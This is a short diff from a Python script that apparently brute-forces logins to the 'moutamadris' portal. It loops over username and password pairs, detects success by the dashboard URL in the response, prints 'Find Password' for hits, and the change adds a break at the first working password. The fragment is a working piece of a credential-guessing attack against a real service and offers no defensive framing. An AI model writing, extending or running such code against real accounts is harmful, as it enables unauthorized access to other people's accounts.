@@ -37,6 +37,7 @@ with requests.Session() as s:
             
             if "/moutamadris/Dashboard" in r.text :
                 print(user_1,"Find Password :",pass_2)
+                break;
             elif "/moutamadris/Dashboard" not in r.text :
                 print(user_1,"Error Password :",pass_2)
             
